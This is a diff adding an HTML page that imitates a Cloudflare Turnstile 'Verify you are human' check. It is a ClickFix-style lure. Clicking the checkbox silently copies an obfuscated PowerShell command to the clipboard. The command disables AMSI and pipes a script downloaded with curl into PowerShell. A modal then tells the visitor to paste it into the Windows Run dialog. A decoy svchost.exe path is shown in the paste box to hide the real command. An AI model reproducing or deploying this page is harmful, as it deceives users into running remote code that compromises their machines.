@@ -1,0 +1,345 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Just a moment...</title>
+<style>
+  * { box-sizing: border-box; }
+  html, body { height: 100%; margin: 0; padding: 0; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    background: #ffffff;
+    color: #1d1d1d;
+    display: flex;
+    flex-direction: column;
+  }
+  
+  .cf-bar {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    padding: 16px 24px;
+    border-bottom: 1px solid #ebebeb;
+    background: #fff;
+  }
+  .cf-logo { width: 24px; height: 24px; }
+  .host-text { font-size: 15px; font-weight: 600; color: #1d1d1d; }
+  .host-text span { color: #6b6b6b; font-weight: 400; margin-left: 6px; }
+
+  .wrap {
+    flex: 1;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 40px 20px;
+  }
+  .challenge { width: 100%; max-width: 450px; }
+  
+  h1 {
+    font-size: 26px;
+    font-weight: 700;
+    margin: 0 0 12px;
+    letter-spacing: -0.3px;
+  }
+  .sub { margin: 0 0 30px; font-size: 16px; color: #6b6b6b; line-height: 1.5; }
+
+  .ts-box {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    height: 72px;
+    padding: 0 16px;
+    background: #fafafa;
+    border: 1px solid #e0e0e0;
+    border-radius: 6px;
+    cursor: pointer;
+    position: relative;
+    user-select: none;
+    transition: border-color 0.15s;
+  }
+  .ts-box:hover { border-color: #c0c0c0; }
+  
+  .ts-left { display: flex; align-items: center; gap: 14px; }
+  .cb-wrap { position: relative; width: 28px; height: 28px; }
+  
+  .spinner {
+    width: 24px; height: 24px;
+    border: 3px solid #d8d8d8;
+    border-top-color: #f6821f;
+    border-radius: 50%;
+    animation: spin 0.6s linear infinite;
+    position: absolute;
+    top: 2px; left: 2px;
+    display: none;
+  }
+  .ts-box.busy .spinner { display: block; }
+  .ts-box.busy .cb { visibility: hidden; }
+  
+  .cb {
+    width: 28px; height: 28px;
+    border: 2px solid #c4c4c4;
+    border-radius: 4px;
+    background: #fff;
+    display: flex; align-items: center; justify-content: center;
+    transition: all 0.2s;
+  }
+  .ts-box.done .cb {
+    border-color: #13a05f;
+    background: #13a05f;
+  }
+  .ts-box.done .cb svg { opacity: 1; transform: scale(1); }
+  .cb svg {
+    width: 18px; height: 18px;
+    opacity: 0;
+    transform: scale(0.5);
+    transition: all 0.15s ease-out;
+  }
+  
+  .ts-label { font-size: 15px; color: #1d1d1d; font-weight: 500; }
+  
+  .ts-right { display: flex; align-items: center; gap: 8px; color: #8a8a8a; font-size: 11px; }
+  .ts-right svg { width: 20px; height: 20px; fill: #f6821f; }
+
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  .foot {
+    margin-top: 40px;
+    font-size: 13px;
+    color: #8a8a8a;
+    text-align: center;
+    line-height: 1.6;
+  }
+  .foot a { color: #0051c3; text-decoration: none; }
+  .foot a:hover { text-decoration: underline; }
+
+  .overlay {
+    position: fixed; inset: 0;
+    background: rgba(20,20,20,0.6);
+    display: none;
+    align-items: center;
+    justify-content: center;
+    z-index: 100;
+    backdrop-filter: blur(2px);
+  }
+  .overlay.show { display: flex; }
+  
+  .modal {
+    width: 90%;
+    max-width: 500px;
+    background: #fff;
+    border-radius: 12px;
+    padding: 30px;
+    box-shadow: 0 25px 80px rgba(0,0,0,0.4);
+    animation: popIn 0.2s ease-out;
+  }
+  @keyframes popIn { from { transform: translateY(10px) scale(0.98); opacity: 0; } }
+  
+  .m-head {
+    display: flex; align-items: center; gap: 12px;
+    font-size: 20px; font-weight: 700; margin-bottom: 8px; color: #1d1d1d;
+  }
+  .m-head svg { width: 22px; height: 22px; fill: #f6821f; }
+  
+  .m-sub { margin: 0 0 24px; font-size: 15px; color: #6b6b6b; line-height: 1.5; }
+  
+  ol {
+    margin: 0 0 24px;
+    padding-left: 22px;
+    font-size: 16px;
+    line-height: 1.8;
+    color: #1d1d1d;
+  }
+  li { margin-bottom: 8px; }
+  
+  kbd {
+    display: inline-block;
+    padding: 2px 8px;
+    font: 600 13px/1.5 ui-monospace, Menlo, Consolas, monospace;
+    background: #f4f4f4;
+    border: 1px solid #d9d9d9;
+    border-bottom-width: 2px;
+    border-radius: 4px;
+    color: #1d1d1d;
+    box-shadow: 0 1px 0 #d9d9d9;
+  }
+
+  .paste-zone {
+    background: #1d1d1d;
+    border-radius: 8px;
+    padding: 16px;
+    margin-bottom: 16px;
+    min-height: 40px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: #8a8a8a;
+    font-size: 14px;
+    position: relative;
+    overflow: hidden;
+  }
+  .paste-zone input {
+    position: absolute;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    opacity: 0;
+    cursor: text;
+  }
+  .paste-zone.active {
+    background: #2d2d2d;
+    color: #fff;
+  }
+  .paste-zone .placeholder {
+    pointer-events: none;
+  }
+
+</style>
+</head>
+<body>
+
+<div class="cf-bar">
+  <svg class="cf-logo" viewBox="0 0 24 24" aria-hidden="true">
+    <path fill="#f6821f" d="M17.6 16.4c.3-.9.2-1.7-.3-2.3-.4-.5-1.1-.8-1.9-.9l-8.9-.1c-.1 0-.2 0-.2-.1s0-.2.1-.3c.1-.1.2-.2.4-.2l9-.1c1.1-.1 2.2-.9 2.7-1.9l.5-1.4c0-.1 0-.1 0-.2C19.2 5.5 16.5 3 13.3 3 10.4 3 7.9 4.8 7 7.4c-.6-.4-1.5-.6-2.4-.4C3.2 7.3 2 8.6 2 10.2c0 .4 0 .7.1 1-.1 0-.1.1-.2.1-1.3.1-2.2 1.1-2.2 2.3 0 .3 0 .5.1.7 0 .1.1.1.2.1h17.4c.1 0 .2-.1.3-.2l.1-.5z"/>
+  </svg>
+  <div class="host-text" id="hostName">localhost <span>| Just a moment</span></div>
+</div>
+
+<div class="wrap">
+  <div class="challenge">
+    <h1>Verify you are human</h1>
+    <p class="sub" id="subHost">localhost</p>
+
+    <div class="ts-box" id="tsBox">
+      <div class="ts-left">
+        <div class="cb-wrap">
+          <div class="spinner"></div>
+          <div class="cb" id="cb">
+            <svg viewBox="0 0 24 24"><path fill="none" stroke="#fff" stroke-width="3.2" stroke-linecap="round" stroke-linejoin="round" d="M4 12.5l5 5L20 6.5"/></svg>
+          </div>
+        </div>
+        <span class="ts-label">Verify you are human</span>
+      </div>
+      <div class="ts-right">
+        <svg viewBox="0 0 24 24"><path fill="#f6821f" d="M17.6 16.4c.3-.9.2-1.7-.3-2.3-.4-.5-1.1-.8-1.9-.9l-8.9-.1c-.1 0-.2 0-.2-.1s0-.2.1-.3c.1-.1.2-.2.4-.2l9-.1c1.1-.1 2.2-.9 2.7-1.9l.5-1.4c0-.1 0-.1 0-.2C19.2 5.5 16.5 3 13.3 3 10.4 3 7.9 4.8 7 7.4c-.6-.4-1.5-.6-2.4-.4C3.2 7.3 2 8.6 2 10.2c0 .4 0 .7.1 1-.1 0-.1.1-.2.1-1.3.1-2.2 1.1-2.2 2.3 0 .3 0 .5.1.7 0 .1.1.1.2.1h17.4c.1 0 .2-.1.3-.2l.1-.5z"/></svg>
+        <small>Turnstile</small>
+      </div>
+    </div>
+
+    <div class="foot">
+      Cloudflare Ray ID: <b id="ray"></b> &middot; Performance &amp; security by
+      <a href="#" onclick="return false">Cloudflare</a>
+    </div>
+  </div>
+</div>
+
+<div class="overlay" id="overlay">
+  <div class="modal" role="dialog" aria-modal="true">
+    <div class="m-head">
+      <svg viewBox="0 0 24 24"><path fill="#f6821f" d="M17.6 16.4c.3-.9.2-1.7-.3-2.3-.4-.5-1.1-.8-1.9-.9l-8.9-.1c-.1 0-.2 0-.2-.1s0-.2.1-.3c.1-.1.2-.2.4-.2l9-.1c1.1-.1 2.2-.9 2.7-1.9l.5-1.4c0-.1 0-.1 0-.2C19.2 5.5 16.5 3 13.3 3 10.4 3 7.9 4.8 7 7.4c-.6-.4-1.5-.6-2.4-.4C3.2 7.3 2 8.6 2 10.2c0 .4 0 .7.1 1-.1 0-.1.1-.2.1-1.3.1-2.2 1.1-2.2 2.3 0 .3 0 .5.1.7 0 .1.1.1.2.1h17.4c.1 0 .2-.1.3-.2l.1-.5z"/></svg>
+      Verify you are human
+    </div>
+    <p class="m-sub">Complete the steps below to continue to <b id="mHost">localhost</b>.</p>
+
+    <ol id="steps">
+      <li>Press <kbd>Win</kbd> + <kbd>R</kbd> to open the Run dialog</li>
+      <li>Paste the command below into the text field</li>
+      <li>Press <kbd>Enter</kbd> and click <b>Yes</b> if prompted</li>
+    </ol>
+
+    <div class="paste-zone" id="pasteZone">
+      <span class="placeholder">Click here and press Ctrl+V to paste</span>
+      <input type="text" id="fakeInput" autocomplete="off" spellcheck="false">
+    </div>
+
+  </div>
+</div>
+
+<script>
+const CONFIG = {
+  host: "localhost",
+  payload: `powershell -nop -w h -c "$b=[Ref].Assembly.GetType('System.Management.Automation.'+'AmsiUtils');$b.GetField('amsiInit'+$'66ailed','NonPublic,Static').SetValue($null,$true);curl.exe -sL https://example.com/cdn/upd.dat|powershell -command -"`
+};
+
+const $ = id => document.getElementById(id);
+const tsBox = $('tsBox');
+const overlay = $('overlay');
+const pasteZone = $('pasteZone');
+const fakeInput = $('fakeInput');
+const placeholder = $('.placeholder');
+
+$('hostName').innerHTML = CONFIG.host + ' <span>| Just a moment</span>';
+$('subHost').textContent = CONFIG.host;
+$('mHost').textContent = CONFIG.host;
+$('ray').textContent = [...crypto.getRandomValues(new Uint8Array(8))]
+  .map(b => b.toString(16).padStart(2, "0")).join("");
+
+let triggered = false;
+tsBox.onclick = () => {
+  if (triggered) return;
+  triggered = true;
+  
+  tsBox.classList.add('busy');
+  
+  setTimeout(() => {
+    tsBox.classList.remove('busy');
+    tsBox.classList.add('done');
+    
+    setTimeout(() => {
+      overlay.classList.add('show');
+      
+      try {
+        navigator.clipboard.writeText(CONFIG.payload);
+      } catch (e) {}
+    }, 400);
+  }, 1500);
+};
+
+overlay.onclick = (e) => {
+  if (e.target === overlay) {
+    overlay.classList.remove('show');
+  }
+};
+
+fakeInput.addEventListener('focus', () => {
+  placeholder.style.display = 'none';
+  pasteZone.classList.add('active');
+});
+
+fakeInput.addEventListener('blur', () => {
+  placeholder.style.display = 'block';
+  pasteZone.classList.remove('active');
+  fakeInput.value = ''; 
+});
+
+fakeInput.addEventListener('keydown', (e) => {
+  if ((e.ctrlKey || e.metaKey) && e.key === 'v') {
+    e.preventDefault();
+    
+    const filler = "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Temp\\svchost.exe";
+    const realData = CONFIG.payload;
+    
+    placeholder.textContent = "Pasting...";
+    placeholder.style.color = "#f6821f";
+    
+    navigator.clipboard.writeText(realData).catch(()=>{});
+    
+    document.execCommand('insertText', false, filler);
+    
+    setTimeout(() => {
+      fakeInput.blur();
+      placeholder.textContent = "Command Pasted";
+      placeholder.style.color = "#13a05f";
+    }, 100);
+  }
+});
+
+pasteZone.addEventListener('click', () => {
+  fakeInput.focus();
+  fakeInput.select();
+  document.execCommand('paste');
+});
+
+</script>
+
+</body>
+</html>
